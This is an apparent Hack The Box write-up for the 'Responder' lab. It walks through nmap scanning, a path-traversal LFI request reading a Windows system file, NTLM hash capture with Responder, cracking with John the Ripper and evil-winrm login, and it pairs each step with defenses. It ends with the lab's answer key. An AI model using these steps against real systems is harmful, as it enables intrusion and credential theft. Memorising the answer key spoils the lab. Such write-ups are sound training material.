# 🧪 Hack The Box: Responder

> 🔗 https://app.hackthebox.com/machines/Responder

## 🎯 Goal
Gain access using:
LFI → hash capture → crack → remote access

---

## 🧠 Attack Chain

nmap → LFI → Responder → NTLM → John → WinRM → flag

---

# 🔍 Step 1 — Scan

```bash
nmap -sC -sV <TARGET_IP>
```

## Why
You must discover services first.

## Alternative
- masscan
- rustscan

## Defense
- firewall
- close unused ports

---

# 🧪 Step 2 — LFI

```bash
curl "http://unika.htb/index.php?page=../../../../windows/system32/drivers/etc/hosts"
```

## Why
User input is not filtered.

## Alternative
- Burp Suite
- fuzzing

## Defense
- whitelist inputs
- sanitize paths

---

# 📡 Step 3 — Responder

```bash
sudo responder -I tun0
```

## Why
SMB request leaks NTLM hash

## Alternative
- ntlmrelayx

## Defense
- disable NTLM
- enforce SMB signing

---

# 🔓 Step 4 — Crack

```bash
john --wordlist=rockyou.txt hash.txt
```

## Why
Weak password

## Alternative
- hashcat

## Defense
- strong passwords
- MFA

---

# 🖥️ Step 5 — WinRM

```bash
evil-winrm -i <IP> -u Administrator -p badminton
```

## Why
Valid creds + open service

## Defense
- restrict access
- use HTTPS

---

# 🚩 Step 6 — Flag

```powershell
type C:\Users\mike\Desktop\flag.txt
```

---
## 📋 Task Answers

<details>
<summary>Show answers</summary>

1. unika.htb  
2. php  
3. page  
4. ../../../../windows/system32/drivers/etc/hosts  
5. //IP/file  
6. New Technology Lan Manager  
7. -I  
8. John The Ripper  
9. badminton  
10. 5985  
11. mike  

</details>

---

# 🧠 Conclusion

Multiple small weaknesses → full compromise
